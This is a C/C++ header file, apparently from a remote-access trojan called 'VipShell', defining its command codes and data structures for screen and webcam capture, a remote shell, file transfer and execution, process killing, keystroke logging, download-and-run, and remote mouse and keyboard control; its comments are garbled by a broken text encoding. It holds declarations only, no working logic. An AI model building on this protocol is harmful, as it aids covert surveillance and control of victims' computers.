#pragma once
#include <windows.h>
#define CMD_GETDOWORK 0   //Ҫ��Server������ 
//�ӵ�Ŀ�� ���� 0 ��һ������ 1 ������Ļ��Ϣ 2 ���ӷ���Ƶ��Ϣ�� 3 ����SHELL  4 FileManage  5 ���̼�¼
#define CMD_GETSCREEN 1   //������Ļ
#define CMD_BUFLEN    2   //����������
#define CMD_ISOK      3   //OK
#define CMD_GETCAP    4   //��ȡ��Ƶ
#define CMD_ERROR     5   //����
#define CMD_GETSHELL  6   //��ȡshell
#define CMD_GETFILEMANAGE    7   //FileManage
#define CMD_GETSYSTEMINFO   8   //ϵͳ��Ϣ(����ʹ��)
#define CMD_KEYDOWN 9      //WM_KEYDOWN 
#define CMD_KEYUP   10       //WM_KEYUP
#define CMD_MOUSEMOVE  11       //MOUSEMOVE
#define CMD_LBUTTONDOWN  12       //LBUTTONDOWN
#define CMD_LBUTTONUP   13       //LBUTTONUP
#define CMD_LBUTTONDBLCLK 14
#define CMD_RBUTTONDOWN 15        
#define CMD_RBUTTONUP   16
#define CMD_RBUTTONDBLCLK 17
#define CMD_KEYCTRLALTDEL 18    // Ctrl + Alt + del 

#define FILE_GETROOT		2049             //�����ҵĵ���
#define FILE_GETFILEPATH    2050             //���ط���ָ��Ŀ¼���ļ�
#define FILE_DELETEFILE     2051             //����ɾ���ļ�
#define FILE_RUNFILE        2052             //���������ļ�
#define FILE_MOVEFILE       2053             //�����������ļ�
#define FILE_DWONFILE       2054             //�����ļ�
#define FILE_UPFILE         2055             //�ϴ��ļ�
#define FILE_CREATEDIR      2056             //�����ļ���

#define CMD_GETPROCESSLIST  2057             //�����б�
#define CMD_KILLPROCESS     2058             //��������
#define CMD_GETKEYLOG       2059             //��ʼ���̼�¼

#define CMD_DOWNFILERUN     2060             //�����ļ���������
#define CMD_SETCONFIG       2061             //���������ļ���Ϣ



struct tagVipShellCmd
{
	DWORD dwCmd;
	DWORD dw1;
	DWORD dw2;
	DWORD dw3;
	BYTE pBuff[256  * 2 ];
};

#define DEF_CMDTYPE_CmdTypeDWORD  0   // 


/******SYSTEMINFO****/
struct tagServerSystemInfo
{
	WCHAR szExplain[100];    //ע��
	WCHAR szName[100];       //������
	DWORD dwPlatformId;      //ϵͳ�汾���
	DWORD dwMajorVersion;    //ϵͳ�汾���
	DWORD dwMinorVersion;    //ϵͳ�汾���
	DWORD dwCpuSpeed;        //cpu�ٶ�
	DWORD dwMemory;          //�ڴ��С
	bool bIsCanCap;          
};

/*****************************/
//�ļ������õĽṹ��
struct structFileInfo {
	WCHAR szName[5];
	DWORD dwType;
	DWORD dwBig;
	ULONGLONG ulltotalspace;
	ULONGLONG ullfreespace;
	ULONGLONG ullcanusebyte;
};
struct tagVipShellFileInfo
{
	WCHAR cFileName[MAX_PATH];
	DWORD dwFileSize;
	FILETIME ftLastWriteTime;
	bool bIsDir;
};

struct tagVipShellProcess
{
	DWORD dwPid;
	WCHAR cFileName[MAX_PATH];
};
